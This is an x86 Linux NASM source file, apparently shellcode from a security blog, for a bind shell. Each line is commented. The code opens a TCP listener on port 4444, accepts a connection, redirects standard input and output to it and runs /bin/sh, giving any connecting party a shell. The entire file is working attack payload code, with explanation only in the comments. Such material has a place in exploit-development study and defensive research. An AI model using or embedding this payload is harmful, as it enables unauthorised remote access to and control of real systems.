; Filename: bind_shell.nasm
; Author:  Gal Nagli
; Blog:  naglinagli.github.io

global _start			

section .text
_start:
	
; setting up the socket
       xor eax, eax    ; zeroing out the eax register
       mov al, 0x66    ; hex sys_socketcall (102 in decimal)

       xor ebx, ebx    ; zeroing out the ebx register
       mov bl, 0x1     ; assigning 1 to ebx register (SYS_SOCKET)

       xor esi, esi    ; zeroing out the esi register
       push esi        ; push 0 to the stack (IPPROTO_IP)
       push ebx        ; push 1 to the stack (SOCK_STREAM)
       push 0x2        ; push 2 to the stack (AF_INET)

       mov ecx, esp    ; keep 1st argument address in ecx
       int 0x80         ; syscall

; Bind the socket

       xchg edi, eax   ; save the file descriptor returned to eax in the edi register

       xor eax, eax
       mov al, 0x66    ; making sure we are on the socketcall syscall.

       push esi        ; esi value is 0, specifing the bind address (0.0.0.0)
       push word 0x5C11        ; push the port number (4444)

       inc ebx         ; ebx value is 2, (SYS_BIND)
       push bx

       mov ecx, esp    ; keep 1st argument address in ecx.

       push byte 16    ; push the address length (addrlen)
       push ecx        ; sockaddr structure
       push edi        ; socketfd (file descriptors)
       mov ecx, esp    ; ecx holds the args array for the syscall
       int 0x80        ; init syscall

; Listen for inbound connection

       xor eax,eax
       xor ebx,ebx

       mov al, 0x66
       mov bl, 0x4     ; ebx value is now 4, (SYS_LISTEN)

       push esi        ; push the value 0 as the backlog
       push edi        ; push the file descriptors
       mov ecx, esp    ; ecx hold the args array for the syscall
       int 0x80        ; init syscall

; Accept inbound connection request

       mov al, 0x66
       inc bl          ; ebx value is not 5, (SYS_ACCEPT)
       push esi        ; push NULL as the addrlen
       push esi        ; push NULL as the sockaddr structure
       push edi        ; push the file descriptor
       mov ecx, esp    ; ecx hold the args array for the syscall
       int 0x80        ; init syscall

; Redirect the file descriptors using dup2

       xchg ebx, eax   ; Moving the file descriptor to ebx
       xor ecx, ecx    ; clearing ecx before using the loop
       mov cl, 0x2     ; setting the loop counter

looper:
       mov al, 0x3F    ; inserting the hex SYS_DUP2 syscall
       int 0x80        ; syscall
       dec ecx         ; the argument for file descriptor(2-stderr,1-stdout,0-stdin)
       jns looper

; Execute /bin/sh with execve

       xor eax, eax
       push eax

       ; PUSH //bin/sh (8 bytes)

       push 0x68732f2f
       push 0x6e69622f

       mov ebx, esp

       push eax
       mov edx, esp

       push ebx
       mov ecx, esp


       mov al, 0xB     ; inserting the hex for SYS_EXECVE Syscall
       int 0x80
